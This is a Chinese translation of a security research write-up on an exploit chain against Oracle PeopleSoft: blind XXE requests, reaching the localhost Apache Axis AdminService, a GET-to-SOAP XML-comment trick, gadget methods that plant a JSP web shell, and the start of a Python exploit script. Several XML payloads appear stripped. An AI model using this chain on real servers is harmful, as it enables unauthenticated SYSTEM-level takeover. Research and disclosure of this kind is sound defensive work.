# ORACLE PEOPLESOFT远程执行代码：将XXE盲注到SYSTEM SHELL
##### 译文声明
本文是翻译文章，文章来源：www.ambionics.io
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## Oracle PeopleSoft
几个月前，我有机会审核了几个Oracle PeopleSoft解决方案，包括PeopleSoft HRMS和PeopleTool。
`PeopleSoft`应用程序使用 了很多不同的端点，其中很 多端点未经过身份验 证。其中也有很多服务是使用了默认密码。导致它在安全方面非常不稳固。
本文以一种通用的方式将XXE载荷转换为系统运行命令（可能影响每个PeopleSoft版本）。
## XXE：访问本地网络
我们之前已经了解了多个XXE，例如CVE-2013-3800或CVE-2013-3821。最后记录的示例是ERPScan的CVE-2017-3548。通常可以利用它们提取PeopleSoft和WebLogic控制台的凭据。但是这两个控制台并没有提供一种简单的获取`shell`的方法。此外
，我们假设服务设置有防火墙， 因此本文中我们无法从本地文件轻松获取 数据（假装）。
CVE-2013-3821:
    POST /PSIGW/HttpListeningConnector HTTP/1.1
    Host: website.com
    Content-Type: application/xml
    ...
    ]>
       &x;
             your_message_content]]>
CVE-2017-3548:
    POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
    Host: website.com
    Content-Type: application/xml
    ...
我们将使用XXE作为从本地主机到达各种服务的一种方式，这种方式可能会绕过防火墙规则或授权检查。唯一的小问题是找到对应服务所绑定的本地端口，我们可以通过`cookie`访问主页时获得该信息:
    Set-Cookie: SNP2118-51500-PORTAL-PSJSESSIONID=9JwqZVxKjzGJn1s5DLf1t46pz91FFb3p!-1515514079;
在这种情况下，可以看出端口是51500。我们可以通过 `http://localhost:51500/`从 内部到达应用程序。
## Apache Axis
许多未经身份验证的服务，其中就包括`Apache Web`服务器，位于URL
`http://website.com/pspc/services`下。`Apache
Axis`允许您使用Java类构建SOAP端点，使用方法是通过生成它们的WSDL和辅助代码来与它们交互。为了管理它，必须与此目录下的`AdminService`进行交互:`http://website.com/pspc/services/AdminService`
``  
例如，以下是管理员根据java.util.Random类创 建端点:
    POST /pspc/services/AdminService
    Host: website.com
    SOAPAction: something
    Content-Type: application/xml
    ...
如上所示，java.util.Random的每个公共方法都将作为web服务提供。  
通过SOAP调用Random.nextInt()是这样的:
    POST /pspc/services/RandomService
    Host: website.com
    SOAPAction: something
    Content-Type: application/xml
    ...
它会回应：
    HTTP/1.1 200 OK
    ...
                1244788438 
此管理端点阻止外部IP访问。但从本地主机到达时不需要密码，这使其成为开发的理想选择。
由于我们使用的是XXE，因此使用POST请求是不可能的，所以我们需要一种将SOAP有效载荷转换为GET的方法。
## Axis : POST到GET
Axis API允许我们发送GET请求。它接收给定的URL参数并将它们转换为SOAP有效载荷。以下是把Axis源代码的GET参数转换为XML有效负载的代码:
    public class AxisServer extends AxisEngine {
        [...]
        {
            String method = null;
            String args = "";
            Enumeration e = request.getParameterNames();
            while (e.hasMoreElements()) {
                String param = (String) e.nextElement();
                if (param.equalsIgnoreCase ("method")) {
                    method = request.getParameter (param);
                }
                else {
                    args += "" + request.getParameter (param) +
                            "";
                }
            }
            String body = "" + args + "";
            String msgtxt = "" +
                    "" + body + "" +
                    "";
        }
    }
要理解它是如何工作的，最好使用一个例子：
     GET /pspc/services/SomeService
         ?method=myMethod
         &parameter1=test1
         &parameter2=test2
相当于:
                test1
                test2
不过，当我们尝试使用此方法设置新端点时会出现问题:我们必须有XML标签属性,并且`code`也通过不了。  
当我们尝试将它们添加到GET请求时，例如：
     GET /pspc/services/SomeService
         ?method=myMethod+attr0="x"
         &parameter1+attr1="y"=test1
         &parameter2=test2
以下是我们最终的结果：
                test1
                test2
很明显，这不是有效的XML，我们的请求被拒绝。  
如果我们将整个有效负载放在方法参数中，如下所示：
    GET / pspc / services / SomeService
         ？method = myMethod + attr =“x”>  y  
            y
            y
最终解决方案来自于使用XML注释：
     GET /pspc/services/SomeService
         ?method=!-->y
            y
            y
由于我们添加的前缀`!-->`，第一个有效载荷便是``，是
注释的结束。因此第一行被忽略，我们的有效载荷现在只被解释一次。
由此，我们可以将任何来自POST的SOAP请求转换为GET，这意味着我们可以将任何类作为`Axis`服务部署,使用XXE绕过IP检查。
## Axis:Gadgets
Apache Axis不允许我们在部署它们时上传我们自己的Java类;
因此我们必须与已有的漏洞结合。在PeopleSoft的包含了`Axis`实例的pspc.war中进行了一些研究之后，发现在org.apache.pluto.portalImpl包的类有一些有趣的方法。首先，addToEntityReg(String[]
args)允许我们在XML文件的末尾添加任意数据。其次，copy(file1,
file2)允许我们在任何地方使用复制。这足以获得一个shell，通过在我们的XML中插入一个JSP负载，并将其复制到`webroot`中。
如预期的那样，它作为SYSTEM运行，导致未经身份验证的远程系统攻击，仅来自XXE。
## 利用
这个利用向量对于每个最近的PeopleSoft版本应该或多或少是通用的。XXE端点只需要修改。
    #!/usr/bin/python3
    # Oracle PeopleSoft SYSTEM RCE
    # https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce
    # cf
    # 2017-05-17
    import requests
    import urllib.parse
    import re
    import string
    import random
    import sys
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    try:
        import colorama
    except ImportError:
        colorama = None
    else:
        colorama.init()
        COLORS = {
            '+': colorama.Fore.GREEN,
            '-': colorama.Fore.RED,
            ':': colorama.Fore.BLUE,
            '!': colorama.Fore.YELLOW
        }
    URL = sys.argv[1].rstrip('/')
    CLASS_NAME = 'org.apache.pluto.portalImpl.Deploy'
    PROXY = 'localhost:8080'
    # shell.jsp?c=whoami
    PAYLOAD = ''
    class Browser:
        """Wrapper around requests.
        """
        def __init__(self, url):
            self.url = url
            self.init()
        def init(self):
            self.session = requests.Session()
            self.session.proxies = {
                'http': PROXY,
                'https': PROXY